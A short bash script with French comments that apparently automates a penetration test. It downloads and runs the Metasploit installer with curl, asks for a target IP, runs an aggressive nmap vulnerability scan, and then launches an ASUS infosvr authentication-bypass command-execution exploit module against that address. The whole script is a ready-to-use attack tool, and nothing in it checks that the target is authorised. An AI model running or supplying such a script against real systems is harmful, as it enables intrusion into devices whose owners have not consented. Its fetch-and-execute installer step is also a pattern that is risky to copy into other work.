#!/bin/bash

# Mise à jour et installation des dépendances
sudo apt update && sudo apt upgrade
sudo apt install nmap -y
sudo curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall

# Création du répertoire pour les fichiers de pentest
pentest_dir="$PWD/pentest_files"
mkdir -p "$pentest_dir"

# Interface Pentest

echo "
  ██╗  ██╗███████╗██████╗ ██╗   ██╗ ██████╗ ████████╗
  ██║ ██╔╝██╔════╝██╔══██╗██║   ██║██╔═══██╗╚══██╔══╝
  █████╔╝ █████╗  ██████╔╝██║   ██║██║   ██║   ██║   
  ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║██║   ██║   ██║   
  ██║  ██╗███████╗██████╔╝╚██████╔╝╚██████╔╝   ██║   
  ╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝    ╚═╝   
       ██╗██████╗  ██████╗ ███████╗██████╗ ██╗     
      ██╔╝██╔══██╗██╔═══██╗██╔════╝██╔══██╗██║     
     ██╔╝ ██████╔╝██║   ██║█████╗  ██████╔╝██║     
    ██╔╝  ██╔══██╗██║   ██║██╔══╝  ██╔══██╗██║     
   ██╔╝   ██║  ██║╚██████╔╝███████╗██║  ██║███████╗
   ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝
"
read -p "Bonjour, veuillez saisir l'adresse IP de la cible : " target
if [ -z "$target" ]; then
   echo "L'adresse IP est vide."
   exit 1
fi

# Scan Nmap avec sauvegarde du fichier
nmap -T4 -sS -sV -O -A --script=vulners --stats-every 10s "$target" -oX "$pentest_dir/scan.xml"

# Utilisation de l'exploit avec Metasploit
msfconsole -q -x "db_import $pentest_dir/scan.xml; hosts -R; setg RHOST $target; search telnet; use exploit/linux/misc/asus_infosvr_auth_bypass_exec; set RHOSTS $target; run; save; exit;"
